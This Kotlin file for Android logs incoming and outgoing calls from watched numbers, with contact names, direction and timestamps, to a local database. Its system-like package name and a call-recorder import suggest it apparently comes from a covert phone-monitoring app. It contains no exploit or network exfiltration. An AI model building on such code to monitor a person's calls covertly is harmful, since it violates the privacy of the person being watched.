package com.android.services.util

import android.content.Context
import android.telephony.PhoneNumberUtils
import com.android.services.db.entities.TextAlert
import com.android.services.enums.TextAlertCategory
import com.android.services.models.SmsCallAlert
import com.android.services.receiver.CallRecorderReceiver

object TextAlertUtils {

    @Throws(Exception::class)
    fun performCallAlertTask(
        applicationContext: Context,
        mCallNumber: String,
        mIsIncoming: Boolean,
    ) {
        val textAlertRepository =
            InjectorUtils.provideTextAlertRepository(applicationContext)
        textAlertRepository.selectTextAlerts { textAlerts ->
            if (textAlerts.isNotEmpty()) {
                val callAlerts =
                    textAlerts.filter { it.category == TextAlertCategory.calls.toString() }
                if (callAlerts.isNotEmpty()) {
                    if (mCallNumber.isEmpty()) {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} call number is empty")
                    } else {
                        executeCallAlertTask(
                            applicationContext,
                            mCallNumber ?: "",
                            if (mIsIncoming) "Incoming" else "Outgoing",
                            callAlerts
                        )
                    }
                } else {
                    logVerbose("${AppConstants.TEXT_ALERT_TYPE} call alerts are empty")
                }
            }
        }
    }

    private fun executeCallAlertTask(
        applicationContext: Context,
        phoneNumber: String,
        direction: String,
        callAlerts: List<TextAlert>,
    ) {
        callAlerts.forEach { callAlert ->
            try {
                if (callAlert.type == "phone") {
                    val numberEquals = PhoneNumberUtils.compare(phoneNumber, callAlert.callerId)
                    if (numberEquals) {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} its an call alert for phone number ${callAlert.callerId}")
                        addTextAlertEvent(applicationContext, phoneNumber, direction, callAlert)
                    }
                }
            } catch (exception: Exception) {
                logException("${AppConstants.TEXT_ALERT_TYPE} executeCallAlertTask exception = ${exception.message}")
            }
        }
    }

    private fun addTextAlertEvent(
        applicationContext: Context,
        phoneNumber: String,
        direction: String, callAlert: TextAlert,
    ) {
        val callCallAlert = SmsCallAlert()
        callCallAlert.also {
            it.phoneNumber = phoneNumber
            it.contactName = AppUtils.getContactName(phoneNumber, applicationContext)
            it.body = ""
            it.type = direction
            it.date = AppUtils.formatDate(System.currentTimeMillis().toString())
        }
        RoomDBUtils.addTextAlertEvent(applicationContext, callAlert, callCallAlert)
    }
}